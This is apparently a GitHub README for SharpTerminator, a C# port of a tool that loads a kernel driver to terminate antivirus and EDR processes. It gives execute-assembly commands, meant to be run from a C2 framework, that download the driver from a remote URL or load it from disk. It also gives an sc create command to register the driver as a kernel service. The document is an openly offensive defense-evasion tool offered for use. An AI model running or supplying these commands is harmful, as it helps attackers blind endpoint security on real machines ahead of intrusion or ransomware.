# SharpTerminator

C# port of ZeroMemoryEx's Terminator, so all hail goes to him.

# Usage

You can download the driver from a remote URL using SharpTerminator and load it to terminate AV/EDR processes, or you can directly load it to the disk to perform the same operation.

When using Remote URL, the driver is downloaded to "C:\Windows\Temp" and then loaded from there.

In fact, there is no difference between them; if you don't want to use the upload function in your C2, you can use the other one.

Loading from remote url:
```
execute-assembly SharpTerminator.exe --url "http://remoteurl.com:80/Terminator.sys"
```
Loading from disk:
```
execute-assembly SharpTerminator.exe --disk "C:\path\to\driver\Terminator.sys"
```


### Download driver from remote url and terminate AV/EDR:

![sharpterminator-url](https://github.com/mertdas/SharpTerminator/assets/48562581/ded76930-780a-4ad0-bdf2-43f451be2e6c)


### Load driver from disk and terminate AV/EDR:

![sharpterminatsor-disk](https://github.com/mertdas/SharpTerminator/assets/48562581/ee37b11d-c803-48a9-ac97-0b0c17af1af7)

# Known Issue
If you get "Failed to register the process in the trusted list!" error you should add service manually:<br>
```
sc create Terminator binPath= "C:\path\to\driver.sys" type= kernel start= demand
```

# Credit
ZeroMemoryEx https://github.com/ZeroMemoryEx/Terminator<br>
Spyboy :)

